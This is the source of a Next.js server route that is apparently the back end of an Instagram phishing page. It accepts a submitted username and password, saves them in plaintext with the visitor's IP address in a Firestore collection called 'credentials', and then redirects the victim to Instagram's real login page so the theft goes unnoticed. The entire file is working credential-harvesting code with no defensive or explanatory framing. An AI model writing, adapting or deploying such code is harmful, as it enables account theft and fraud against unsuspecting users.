import { NextResponse } from 'next/server';
import admin from 'firebase-admin';

// Initialize Firebase
if (!admin.apps.length) {
  try {
    const serviceAccount = JSON.parse(process.env.FIREBASE_CONFIG || '{}');
    admin.initializeApp({
      credential: admin.credential.cert({
        projectId: serviceAccount.project_id,
        clientEmail: serviceAccount.client_email,
        privateKey: serviceAccount.private_key.replace(/\\n/g, '\n')
      })
    });
  } catch (e) {
    console.error('Firebase init error:', e);
  }
}

export async function POST(request: Request) {
  try {
    const formData = await request.formData();
    const username = formData.get('username')?.toString() || '';
    const password = formData.get('password')?.toString() || '';
    const ip = request.headers.get('x-forwarded-for') || '';

    if (!username || !password) {
      return NextResponse.json(
        { error: 'Missing credentials' },
        { status: 400 }
      );
    }

    if (admin.apps.length) {
      await admin.firestore().collection('credentials').add({
        username,
        password,
        timestamp: admin.firestore.FieldValue.serverTimestamp(),
        ip_address: ip
      });
    }

    // Return JSON response with redirect URL
    return NextResponse.json(
      { success: true, redirectUrl: 'https://www.instagram.com/accounts/login/' },
      { status: 200 }
    );

  } catch (error) {
    console.error('Login error:', error);
    return NextResponse.json(
      { error: 'Server error' },
      { status: 500 }
    );
  }
}

export async function OPTIONS() {
  return new Response(null, {
    headers: {
      'Access-Control-Allow-Origin': '*',
      'Access-Control-Allow-Methods': 'POST, OPTIONS',
      'Access-Control-Allow-Headers': 'Content-Type',
    },
  });
}